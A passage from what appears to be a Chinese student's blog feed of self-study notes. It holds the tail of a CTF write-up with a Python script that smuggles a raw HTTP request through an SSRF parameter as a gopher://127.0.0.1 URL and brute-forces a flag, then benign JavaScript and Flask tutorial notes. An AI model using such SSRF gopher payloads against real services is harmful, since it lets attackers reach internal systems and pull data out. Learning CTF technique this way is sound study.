class="hljs-comment">#注意后面一定要有回车，回车结尾表示http请求结束</span><br>        tmp = urllib.parse.quote(payloads)<br>        new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>        result = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br>        <span class="hljs-comment"># 请求网页</span><br>        url = <span class="hljs-string">&#x27;xxxxxxx&#x27;</span><br>        data = &#123;<span class="hljs-string">&#x27;url&#x27;</span>: result&#125;<br>        <span class="hljs-comment"># print(data)</span><br>        req = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># print(req.text)</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;meow&#x27;</span> <span class="hljs-keyword">in</span> req.text):<br>             <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;yes&#x27;</span>,<span class="hljs-built_in">chr</span>(number))<br>             final=final+<span class="hljs-built_in">chr</span>(number)<span class="hljs-comment">#+str(i)</span><br>             <span class="hljs-built_in">print</span>(final)<br>             <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            number = number + <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(number),<span class="hljs-string">&#x27;no&#x27;</span>)<br><span class="hljs-built_in">print</span>(final)<br></code></pre></td></tr></table></figure><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>算是很开心拿到这一题的flag，虽然很简单，对ssrf有了更深刻的认识，对python简单脚本的编写认识更深了一点，这里说一个web页面请求头content-length，读取自己post提交数据的表单长度，只有大于或者等于post表单长度才能完整的读取post提交的数据，否则数据读不完整，但是，也不能很大，大了的话跑脚本的时候运行速度会很慢，所以自己在写的时候要特别注意length的大小。其次，自己读题审题一定要仔细，这里漏一点，那里漏一点还怎么玩。进而，脚本编写的太朴素，谁都能看懂，效率就慢了点，等我什么时候再重新写一下这个脚本，再多学学才行。</p><p>很感谢kxy同学，今天帮了我很大的忙，对我的提问做出了讲解，讲的很好，下次还来。</p>]]></content>
    
    
    <categories>
      
      <category>self study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>just a little</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>javascript</title>
    <link href="/2022/01/10/javascript/"/>
    <url>/2022/01/10/javascript/</url>
    
    <content type="html"><![CDATA[<p>looklook</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!DOCTYPE html&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>lionel<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">//js区分大小写,以分号结尾</span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="javascript"><span class="xml"></span></span><br><span class="javascript"><span class="xml"></span></span><br><span class="javascript"><span class="xml">    &lt;!---</span></span><br><span class="javascript"><span class="xml">    控制浏览器弹出一个警告框</span></span><br><span class="javascript"><span class="xml">    alert(<span class="hljs-string">&quot;lionel is a handsome boy&quot;</span>);</span></span><br><span class="javascript"><span class="xml"></span></span><br><span class="javascript"><span class="xml">    让计算机在页面中输出一个内容</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;wwwwww~~~~&quot;</span>);可以向body中输出一个内容</span></span><br><span class="javascript"><span class="xml">    </span></span><br><span class="javascript"><span class="xml">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;我在控制台喔&quot;</span>);向控制台输出一个内容</span></span><br><span class="javascript"><span class="xml">    </span></span><br><span class="javascript"><span class="xml">    可以将js代码编写到外部文件中  xxx.js</span></span><br><span class="javascript"><span class="xml">然后使用同目录下script标签将文件引入</span></span><br><span class="javascript"><span class="xml">     &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;js/xxx.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">     写在外部文件中可以在不同的页面中同时使用，也可以利用浏览器的缓存机制</span><br><span class="xml">    一旦用于引用外部文件此script就不能再编写代码了，写了没用</span><br><span class="xml">    换一个script标签</span><br><span class="xml">    </span><br><span class="xml">    </span><br><span class="xml">    --&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml">     <span class="hljs-comment">&lt;!---可以将js代买编写到标签的onclick属性中</span></span><br><span class="hljs-comment"><span class="xml">    &lt;button onclick=&quot;alert(&#x27;讨厌，点我干嘛&#x27;);&quot;&gt;点我一下&lt;/button&gt;</span></span><br><span class="hljs-comment"><span class="xml">     &lt;a href=&quot;javascript:alert(&#x27;让你点你就点？&#x27;)&quot;&gt;&lt;/a&gt;</span></span><br><span class="hljs-comment"><span class="xml"></span></span><br><span class="hljs-comment"><span class="xml">     --&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"></span><br><span class="xml"></span><br><span class="xml">a.toString()转化为字符串，但对 undefine , null 无效</span><br><span class="xml">String(a)同上并有效</span><br><span class="xml"></span><br><span class="xml">parseInt(a,10)针对字符串a转化为int型，10进制，10可选</span><br><span class="xml">parseFloat同理</span><br><span class="xml">var events = require(&#x27;events&#x27;); </span><br><span class="xml">var emitter = new events.EventEmitter(); </span><br><span class="xml">emitter.on(&#x27;someEvent&#x27;, function(arg1, arg2) &#123; </span><br><span class="xml">    console.log(&#x27;listener1&#x27;, arg1, arg2); </span><br><span class="xml">&#125;); </span><br><span class="xml">emitter.on(&#x27;someEvent&#x27;, function(arg1, arg2) &#123; </span><br><span class="xml">    console.log(&#x27;listener2&#x27;, arg1, arg2); </span><br><span class="xml">&#125;); </span><br><span class="xml">emitter.emit(&#x27;someEvent&#x27;, &#x27;arg1 参数&#x27;, &#x27;arg2 参数&#x27;); </span><br><span class="xml"></span><br><span class="xml">//listener1 arg1 参数 arg2 参数</span><br><span class="xml">//listener2 arg1 参数 arg2 参数</span><br><span class="xml">//on 函数用于绑定事件函数，emit 属性用于触发一个事件</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>self study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>just a little</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>flask study</title>
    <link href="/2021/11/22/flask/"/>
    <url>/2021/11/22/flask/</url>
    
    <content type="html"><![CDATA[<p>BASIC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_world</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;Hello, World!&lt;/p&gt;&quot;</span><br>    <br> ^   <br> |<br> |&lt;------最小的一个应用，启动如下<br><span class="hljs-built_in">set</span> FLASK_APP=hello<br>flask run<br> * Running on http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">5000</span>/<br> <br> <br>flask run 内部可见(<span class="hljs-string">&#x27;只允许本地访问&#x27;</span>)<br>flask run --host=<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> 外部可见( <span class="hljs-string">&#x27;操作系统将监听所有公开访问的IP地址&#x27;</span>)<br>  <br>  <span class="hljs-comment">#Flask 提供了一个 run 命令，该命令用来以开发服务器运行应用。 在开发模式下，开发服务器提供交互式调试器，并在代码更改时重新加载。推荐使用 flask run 命令行脚本运行开发服务器。这需要设置 FLASK_APP 环境变量指向您的应用，且设置 FLASK_ENV=development ， 以用于启用开发模式。</span><br>  <br> <span class="hljs-built_in">set</span> FLASK_APP=hello    <span class="hljs-comment">#(py文件名)</span><br> <br><span class="hljs-comment">#如果需要打开所有开发功能，那么需要在运行 flask run 之前设置 FLASK_ENV 环境变量为 development :</span><br><span class="hljs-built_in">set</span> FLASK_ENV=development<br>flask run<br><br><span class="hljs-comment">#通过&lt;float:num&gt;,&lt;int:num&gt;,&lt;string:username&gt;,可以选定输入的值的类型，同一个url,定义不同的输入类型输入函数，可以输出不同的结果</span><br>如:<br><span class="hljs-comment">#输入浮点数执行第二个，输入字符串执行第一个，输入整型会返回404</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_hello_name</span>(<span class="hljs-params">username</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;hello <span class="hljs-subst">&#123;escape(username)&#125;</span>&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;float:num&gt;&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_float</span>(<span class="hljs-params">num</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(num*<span class="hljs-number">39</span>)<br> <br><span class="hljs-comment">#使用 redirect() 函数可以重定向。使用 abort() 可以 更早退出请求，并返回错误代码</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> abort, redirect, url_for<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    abort(<span class="hljs-number">401</span>)<br>    this_is_never_executed()<br><span class="hljs-comment">#上例实际上是没有意义的，它让一个用户从索引页重定向到一个无法访问的页面（401 表示禁止访问）。但是上例可以说明重定向和出错跳出是如何工作的。  </span><br><br><br><br><span class="hljs-comment">#本地环境变量：https://dormousehole.readthedocs.io/en/latest/quickstart.html#context-locals</span><br>  <br>    <br>    <br><span class="hljs-comment">#url_for() 函数用于--------构建指定函数的URL--------它把函数名称作为第一个 参数。它可以接受任意个关键字参数，每个关键字参数对应 URL 中的变量。未知变量 将添加到 URL 中作为查询参数。  </span><br><span class="hljs-comment">#使用特定的 &#x27;static&#x27; 端点就可以生成相应的 URL</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_file_url/&lt;filename&gt;&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_file_url</span>(<span class="hljs-params">filename</span>):</span><br>    <span class="hljs-keyword">return</span> url_for(<span class="hljs-string">&#x27;static&#x27;</span>, filename=filename)<br><br><span class="hljs-comment">#redirect重定向到上面get_url_for函数，并传参显示/get_file_url/网页的内容</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_file/&lt;filename&gt;&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_file</span>(<span class="hljs-params">filename</span>):</span><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;get_file_url&#x27;</span>, filename=filename))<br>  <br> <br><span class="hljs-comment">#模板渲染  from flask import render_template</span><br><span class="hljs-comment">#使用 render_template() 方法可以渲染模板，只需提供模板名称和需要作为参数传递给模板的变量就行了</span><br><span class="hljs-string">&#x27;render_template的功能是对先引入index.html，同时根据后面传入的参数，对html进行修改渲染,见文末超链接&#x27;</span><br><br><br><br><br><br><br><br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_form_data&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_form_data</span>():</span><br>    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">return</span> request.form  <span class="hljs-comment">#显示提交的所有表单内容</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;it just a get&#x27;</span><br><br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_args&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_args</span>():</span><br>    <span class="hljs-keyword">return</span> request.args   <span class="hljs-comment">#返回所有通过get提交方式提交的内容</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_request_info&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_request_info</span>():</span><br>    <span class="hljs-keyword">return</span> request.path+<span class="hljs-string">&#x27;\n&#x27;</span>+request.method <span class="hljs-comment">#返回/get_request_info POST/GET</span><br><br><br><span class="hljs-comment">#form提交表单代码    </span><br>&lt;form action=<span class="hljs-string">&quot;http://127.0.0.1:5000/upload_file&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>      &lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>      &lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Upload&quot;</span>&gt;<br>&lt;/form&gt; <br><br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename  <span class="hljs-comment">#引入secure_filename以原文件命名</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload_file&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_file</span>():</span><br>    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:<br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        file.save(<span class="hljs-string">f&quot;D://myproject/<span class="hljs-subst">&#123;secure_filename(file.filename)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;it just a white&#x27;</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> make_response<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_cookies&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_cookie</span>():</span><br>    res=make_response(<span class="hljs-string">&#x27;cookie&#x27;</span>,<span class="hljs-number">200</span>)<br>    res.set_cookie(<span class="hljs-string">&#x27;kai wang&#x27;</span>,<span class="hljs-string">&#x27;a hansome boy&#x27;</span>)<br>    <span class="hljs-keyword">return</span> (res)<br><br><br><span class="hljs-comment">#make_response()</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> make_response<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/learn_response&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">learn_response</span>():</span><br>    res=make_response(<span class="hljs-string">&#x27;Resopnse Ok&#x27;</span>,<span class="hljs-number">200</span>)<br>    res.headers[<span class="hljs-string">&#x27;Some Data&#x27;</span>]=<span class="hljs-string">&#x27;data&#x27;</span><br>    <span class="hljs-keyword">return</span> (res)<br><br><br><br><span class="hljs-comment">#task  要求版本</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> session<br><br><span class="hljs-comment"># Set the secret key to some random bytes. Keep this really secret!</span><br>app.secret_key = <span class="hljs-string">b&#x27;_5#y2L&quot;F4Q8z\n\xec]/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ind&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index2</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;hello! <span class="hljs-subst">&#123;session[<span class="hljs-string">&quot;username&quot;</span>]&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello！Customer&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login/&lt;username&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">username</span>):</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Login Succeed <span class="hljs-subst">&#123;username&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not get&#x27;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>    <span class="hljs-comment"># remove the username from the session if it&#x27;s there</span><br>    session.pop(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;logout successfully&#x27;</span><br><br><br><br><span class="hljs-comment">#重定向再看一下,注意路径别冲突</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> session<br><br><span class="hljs-comment"># Set the secret key to some random bytes. Keep this really secret!</span><br>app.secret_key = <span class="hljs-string">b&#x27;_5#y2L&quot;F4Q8z\n\xec]/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Logged in as <span class="hljs-subst">&#123;session[<span class="hljs-string">&quot;username&quot;</span>]&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are not logged in&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        session[<span class="hljs-string">&#x27;username&#x27;</span>] = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            &lt;p&gt;&lt;input type=text name=username&gt;</span><br><span class="hljs-string">            &lt;p&gt;&lt;input type=submit value=Login&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>    <span class="hljs-comment"># remove the username from the session if it&#x27;s there</span><br>    session.pop(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br><br><br><br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/yy19890521/article/details/81034765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163788640416780265497170%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163788640416780265497170&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-81034765.pc_search_all_es&utm_term=flask+render_template()+&spm=1018.2226.3001.4187">render_template</a></p>]]></content>
    
    
    <categories>
      
      <category>self study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>just a little</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker</title>
    <link href="/2021/11/22/docker/"/>
    <url>/2021/11/22/docker/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 